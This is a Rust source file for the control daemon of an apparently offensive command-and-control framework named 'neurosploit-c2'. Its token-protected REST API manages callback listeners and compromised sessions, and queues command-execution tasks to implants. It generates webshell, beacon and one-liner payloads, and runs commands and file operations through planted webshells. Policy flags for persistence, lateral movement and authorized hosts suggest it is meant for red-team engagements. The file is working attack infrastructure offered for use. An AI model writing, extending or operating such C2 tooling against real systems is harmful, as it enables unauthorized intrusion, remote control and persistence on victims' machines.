use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use serde::{Deserialize, Serialize};
use serde_json::json;
use tokio::net::TcpListener;

use super::http::{serve_http, BoxFut, HttpRequest, HttpResponse};
use super::manager::C2Manager;
use super::store::write_private;
use super::types::{Session, Task};
use super::{now_ms, random_token};

#[derive(Serialize, Deserialize)]
struct ControlInfo {
    port: u16,
    token: String,
    pid: u32,
    started_at: i64,
}

/// Run the local control daemon. The CLI starts this automatically on demand.
pub async fn run_daemon(dir: PathBuf, port: u16) -> anyhow::Result<()> {
    let manager = C2Manager::open(dir.clone()).await?;
    manager.restore_listeners().await;
    let tcp = TcpListener::bind(("127.0.0.1", port)).await?;
    let addr = tcp.local_addr()?;
    let token = random_token();
    let info = ControlInfo {
        port: addr.port(),
        token: token.clone(),
        pid: std::process::id(),
        started_at: now_ms(),
    };
    write_private(
        &dir.join("control.json"),
        &serde_json::to_vec_pretty(&info)?,
    )?;
    eprintln!(
        "[c2] control daemon listening on 127.0.0.1:{} (dir {})",
        addr.port(),
        dir.display()
    );

    let handler: Arc<dyn Fn(HttpRequest) -> BoxFut + Send + Sync> = {
        let mgr = manager.clone();
        let token = token.clone();
        Arc::new(move |req: HttpRequest| {
            let mgr = mgr.clone();
            let token = token.clone();
            Box::pin(async move { handle_control(mgr, &token, req).await }) as BoxFut
        })
    };
    serve_http(tcp, handler).await?;
    Ok(())
}

async fn handle_control(mgr: Arc<C2Manager>, token: &str, req: HttpRequest) -> HttpResponse {
    let path = req.path.trim_end_matches('/');
    if path == "/health" {
        return HttpResponse::json(
            200,
            &json!({"ok": true, "service": "neurosploit-c2", "pid": std::process::id()}),
        );
    }
    let provided = req
        .header("x-control-token")
        .or_else(|| {
            req.header("authorization")
                .and_then(|v| v.strip_prefix("Bearer "))
        })
        .unwrap_or("");
    if provided != token {
        return HttpResponse::json(401, &json!({"ok": false, "error": "invalid control token"}));
    }
    mgr.reconcile().await;

    let segs: Vec<&str> = path
        .trim_start_matches('/')
        .split('/')
        .filter(|s| !s.is_empty())
        .collect();
    let method = req.method.as_str();

    if method == "GET" && path == "/api/status" {
        let state = mgr.snapshot().await;
        return HttpResponse::json(
            200,
            &json!({
                "ok": true,
                "policy": state.policy,
                "listeners": state.listeners.iter().map(|l| l.safe()).collect::<Vec<_>>(),
                "sessions": state.sessions,
                "webshells": state.webshells.iter().map(|w| w.safe()).collect::<Vec<_>>(),
                "tasks": state.tasks,
                "events": state.events.iter().rev().take(100).cloned().collect::<Vec<_>>(),
                "payloads": state.payloads,
                "counts": {
                    "listeners": state.listeners.len(),
                    "sessions_active": state.sessions.iter().filter(|s| s.status == "active").count(),
                    "sessions_total": state.sessions.len(),
                    "tasks_queued": state.tasks.iter().filter(|t| t.status == "queued" || t.status == "sent").count(),
                    "webshells": state.webshells.len(),
                },
            }),
        );
    }

    if path == "/api/policy" && (method == "POST" || method == "PUT") {
        let body = req.json().unwrap_or_else(|| json!({}));
        return match mgr.set_policy(&body).await {
            Ok(p) => HttpResponse::json(200, &json!({"ok": true, "policy": p})),
            Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
        };
    }
    if path == "/api/enable" && method == "POST" {
        let b = req.json().unwrap_or_else(|| json!({}));
        let auth = b
            .get("authorization")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let hosts: Vec<String> = b
            .get("hosts")
            .or_else(|| b.get("allowed_hosts"))
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str())
                    .map(|s| s.to_string())
                    .collect()
            })
            .unwrap_or_default();
        return match mgr
            .enable_policy(
                auth,
                b.get("persistence").and_then(|v| v.as_bool()).unwrap_or(false),
                b.get("lateral").and_then(|v| v.as_bool()).unwrap_or(false),
                b.get("allow_public").and_then(|v| v.as_bool()).unwrap_or(false),
                &hosts,
            )
            .await
        {
            Ok(p) => HttpResponse::json(200, &json!({"ok": true, "policy": p})),
            Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
        };
    }
    if path == "/api/disable" && method == "POST" {
        let p = mgr.disable().await;
        return HttpResponse::json(200, &json!({"ok": true, "policy": p}));
    }

    if segs.starts_with(&["api", "listeners"]) {
        return handle_listeners(&mgr, &segs, method, &req).await;
    }
    if segs.starts_with(&["api", "sessions"]) {
        return handle_sessions(&mgr, &segs, method, &req).await;
    }
    if segs.starts_with(&["api", "tasks"]) {
        return handle_tasks(&mgr, &segs, method, &req).await;
    }
    if segs.starts_with(&["api", "events"]) && method == "GET" {
        let limit = req
            .query
            .get("limit")
            .and_then(|v| v.parse::<usize>().ok())
            .unwrap_or(100);
        let ev = mgr.events(limit).await;
        return HttpResponse::json(200, &json!({"ok": true, "events": ev}));
    }
    if segs.starts_with(&["api", "payloads"]) {
        return handle_payloads(&mgr, &segs, method, &req).await;
    }
    if segs.starts_with(&["api", "webshells"]) {
        return handle_webshells(&mgr, &segs, method, &req).await;
    }
    HttpResponse::json(404, &json!({"ok": false, "error": "not found"}))
}

async fn handle_listeners(
    mgr: &Arc<C2Manager>,
    segs: &[&str],
    method: &str,
    req: &HttpRequest,
) -> HttpResponse {
    match (method, segs.len()) {
        ("GET", 2) => {
            let state = mgr.snapshot().await;
            HttpResponse::json(
                200,
                &json!({"ok": true, "listeners": state.listeners.iter().map(|l| l.safe()).collect::<Vec<_>>()}),
            )
        }
        ("POST", 2) => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let s = |k: &str| b.get(k).and_then(|v| v.as_str()).unwrap_or("");
            match mgr
                .create_listener(
                    s("name"),
                    s("bind_host"),
                    b.get("bind_port").and_then(|v| v.as_u64()).unwrap_or(8443) as u16,
                    s("callback_host"),
                    b.get("sleep_seconds").and_then(|v| v.as_u64()).unwrap_or(5) as u32,
                    b.get("jitter_percent").and_then(|v| v.as_u64()).unwrap_or(0) as u32,
                )
                .await
            {
                Ok(l) => HttpResponse::json(200, &json!({"ok": true, "listener": l})),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        ("POST", 4) if segs[3] == "start" => match mgr.start_listener(segs[2]).await {
            Ok(l) => HttpResponse::json(200, &json!({"ok": true, "listener": l})),
            Err(e) => HttpResponse::json(409, &json!({"ok": false, "error": e})),
        },
        ("POST", 4) if segs[3] == "stop" => match mgr.stop_listener(segs[2]).await {
            Ok(()) => HttpResponse::json(200, &json!({"ok": true})),
            Err(e) => HttpResponse::json(409, &json!({"ok": false, "error": e})),
        },
        ("DELETE", 3) => match mgr.delete_listener(segs[2]).await {
            Ok(()) => HttpResponse::json(200, &json!({"ok": true})),
            Err(e) => HttpResponse::json(404, &json!({"ok": false, "error": e})),
        },
        _ => HttpResponse::json(405, &json!({"ok": false, "error": "method not allowed"})),
    }
}

async fn handle_sessions(
    mgr: &Arc<C2Manager>,
    segs: &[&str],
    method: &str,
    req: &HttpRequest,
) -> HttpResponse {
    match (method, segs.len()) {
        ("GET", 2) => {
            let state = mgr.snapshot().await;
            HttpResponse::json(200, &json!({"ok": true, "sessions": state.sessions}))
        }
        ("GET", 3) => match state_session(mgr, segs[2]).await {
            Some(s) => HttpResponse::json(200, &json!({"ok": true, "session": s})),
            None => HttpResponse::json(404, &json!({"ok": false, "error": "session not found"})),
        },
        ("POST", 4) if segs[3] == "sleep" => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let secs = b.get("seconds").and_then(|v| v.as_u64()).unwrap_or(5) as u32;
            let jitter = b.get("jitter").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
            match mgr.set_session_sleep(segs[2], secs, jitter).await {
                Ok(t) => HttpResponse::json(200, &json!({"ok": true, "task": t})),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        ("POST", 4) if segs[3] == "note" => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let note = b.get("note").and_then(|v| v.as_str()).unwrap_or("");
            match mgr.set_session_note(segs[2], note).await {
                Ok(()) => HttpResponse::json(200, &json!({"ok": true})),
                Err(e) => HttpResponse::json(404, &json!({"ok": false, "error": e})),
            }
        }
        ("POST", 4) if segs[3] == "tasks" => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let task_type = b
                .get("task_type")
                .and_then(|v| v.as_str())
                .unwrap_or("exec");
            let payload = b.get("payload").cloned().unwrap_or_else(|| json!({}));
            match mgr.enqueue(segs[2], task_type, payload, "web").await {
                Ok(t) => HttpResponse::json(200, &json!({"ok": true, "task": t})),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        ("DELETE", 3) => match mgr.kill_session(segs[2]).await {
            Ok(()) => HttpResponse::json(200, &json!({"ok": true})),
            Err(e) => HttpResponse::json(404, &json!({"ok": false, "error": e})),
        },
        _ => HttpResponse::json(405, &json!({"ok": false, "error": "method not allowed"})),
    }
}

async fn state_session(mgr: &Arc<C2Manager>, id: &str) -> Option<Session> {
    mgr.snapshot()
        .await
        .sessions
        .into_iter()
        .find(|s| s.id == id)
}

async fn handle_tasks(
    mgr: &Arc<C2Manager>,
    segs: &[&str],
    method: &str,
    req: &HttpRequest,
) -> HttpResponse {
    match (method, segs.len()) {
        ("GET", 2) => {
            let state = mgr.snapshot().await;
            let session = req.query.get("session_id").cloned().unwrap_or_default();
            let status = req.query.get("status").cloned().unwrap_or_default();
            let tasks: Vec<Task> = state
                .tasks
                .into_iter()
                .filter(|t| {
                    (session.is_empty() || t.session_id == session)
                        && (status.is_empty() || t.status == status)
                })
                .collect();
            HttpResponse::json(200, &json!({"ok": true, "tasks": tasks}))
        }
        ("POST", 2) => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let session = b
                .get("session_id")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let task_type = b
                .get("task_type")
                .and_then(|v| v.as_str())
                .unwrap_or("exec");
            let payload = b.get("payload").cloned().unwrap_or_else(|| json!({}));
            let source = b.get("source").and_then(|v| v.as_str()).unwrap_or("web");
            match mgr.enqueue(session, task_type, payload, source).await {
                Ok(t) => HttpResponse::json(200, &json!({"ok": true, "task": t})),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        ("GET", 3) => match mgr.task(segs[2]).await {
            Some(t) => HttpResponse::json(200, &json!({"ok": true, "task": t})),
            None => HttpResponse::json(404, &json!({"ok": false, "error": "task not found"})),
        },
        ("POST", 4) if segs[3] == "cancel" => match mgr.cancel_task(segs[2]).await {
            Ok(()) => HttpResponse::json(200, &json!({"ok": true})),
            Err(e) => HttpResponse::json(409, &json!({"ok": false, "error": e})),
        },
        ("GET", 4) if segs[3] == "wait" => {
            let timeout = req
                .query
                .get("timeout")
                .and_then(|v| v.parse::<u64>().ok())
                .unwrap_or(60);
            match mgr
                .wait_task(segs[2], Duration::from_secs(timeout.min(900)))
                .await
            {
                Ok(t) => HttpResponse::json(200, &json!({"ok": true, "task": t})),
                Err(e) => HttpResponse::json(404, &json!({"ok": false, "error": e})),
            }
        }
        _ => HttpResponse::json(405, &json!({"ok": false, "error": "method not allowed"})),
    }
}

async fn handle_payloads(
    mgr: &Arc<C2Manager>,
    segs: &[&str],
    method: &str,
    req: &HttpRequest,
) -> HttpResponse {
    if method == "GET" && segs.len() == 2 {
        let state = mgr.snapshot().await;
        return HttpResponse::json(200, &json!({"ok": true, "payloads": state.payloads}));
    }
    if method == "GET" && segs.len() == 3 {
        return match mgr.payload_path(segs[2]) {
            Some(p) => match std::fs::read(&p) {
                Ok(bytes) => HttpResponse {
                    status: 200,
                    content_type: "application/octet-stream".into(),
                    body: bytes,
                },
                Err(e) => HttpResponse::json(500, &json!({"ok": false, "error": e.to_string()})),
            },
            None => HttpResponse::json(404, &json!({"ok": false, "error": "payload not found"})),
        };
    }
    if method != "POST" || segs.len() != 3 {
        return HttpResponse::json(405, &json!({"ok": false, "error": "method not allowed"}));
    }
    let b = req.json().unwrap_or_else(|| json!({}));
    let s = |k: &str| b.get(k).and_then(|v| v.as_str());
    match segs[2] {
        "webshell" => match mgr
            .payload_webshell(
                s("shell_type").unwrap_or("php"),
                s("password").unwrap_or(""),
                s("pass_param").unwrap_or("pass"),
                s("cmd_param").unwrap_or("cmd"),
                s("filename"),
            )
            .await
        {
            Ok(v) => HttpResponse::json(200, &v),
            Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
        },
        "beacon" => {
            let Some(listener) = s("listener_id") else {
                return HttpResponse::json(
                    400,
                    &json!({"ok": false, "error": "listener_id is required"}),
                );
            };
            match mgr
                .payload_beacon(
                    listener,
                    s("kind").unwrap_or("bash"),
                    s("host"),
                    s("filename"),
                )
                .await
            {
                Ok(v) => HttpResponse::json(200, &v),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        "oneliner" => {
            let Some(listener) = s("listener_id") else {
                return HttpResponse::json(
                    400,
                    &json!({"ok": false, "error": "listener_id is required"}),
                );
            };
            match mgr.payload_oneliner(listener).await {
                Ok(v) => HttpResponse::json(200, &v),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        other => HttpResponse::json(
            404,
            &json!({"ok": false, "error": format!("unknown payload kind '{other}'")}),
        ),
    }
}

async fn handle_webshells(
    mgr: &Arc<C2Manager>,
    segs: &[&str],
    method: &str,
    req: &HttpRequest,
) -> HttpResponse {
    match (method, segs.len()) {
        ("GET", 2) => {
            let state = mgr.snapshot().await;
            HttpResponse::json(
                200,
                &json!({"ok": true, "webshells": state.webshells.iter().map(|w| w.safe()).collect::<Vec<_>>()}),
            )
        }
        ("POST", 2) => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let s = |k: &str| b.get(k).and_then(|v| v.as_str()).unwrap_or("");
            match mgr
                .add_webshell(
                    s("name"),
                    s("url"),
                    s("password"),
                    s("shell_type"),
                    s("method"),
                    s("cmd_param"),
                    s("pass_param"),
                    s("encoding"),
                    s("os"),
                    s("note"),
                )
                .await
            {
                Ok(c) => {
                    HttpResponse::json(200, &json!({"ok": true, "webshell": c.safe()}))
                }
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        ("PUT", 3) | ("PATCH", 3) => {
            let b = req.json().unwrap_or_else(|| json!({}));
            match mgr.update_webshell(segs[2], &b).await {
                Ok(c) => {
                    HttpResponse::json(200, &json!({"ok": true, "webshell": c.safe()}))
                }
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        ("DELETE", 3) => match mgr.delete_webshell(segs[2]).await {
            Ok(()) => HttpResponse::json(200, &json!({"ok": true})),
            Err(e) => HttpResponse::json(404, &json!({"ok": false, "error": e})),
        },
        ("POST", 4) if segs[3] == "test" => match mgr.webshell_test(segs[2]).await {
            Ok(v) => HttpResponse::json(200, &v),
            Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
        },
        ("POST", 4) if segs[3] == "exec" => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let cmd = b.get("command").and_then(|v| v.as_str()).unwrap_or("");
            match mgr.webshell_exec(segs[2], cmd).await {
                Ok(v) => HttpResponse::json(200, &v),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        ("POST", 4) if segs[3] == "file" => {
            let b = req.json().unwrap_or_else(|| json!({}));
            let s = |k: &str| b.get(k).and_then(|v| v.as_str());
            match mgr
                .webshell_file(
                    segs[2],
                    s("action").unwrap_or("list"),
                    s("path").unwrap_or("."),
                    s("content"),
                    s("target_path"),
                )
                .await
            {
                Ok(v) => HttpResponse::json(200, &v),
                Err(e) => HttpResponse::json(400, &json!({"ok": false, "error": e})),
            }
        }
        _ => HttpResponse::json(405, &json!({"ok": false, "error": "method not allowed"})),
    }
}
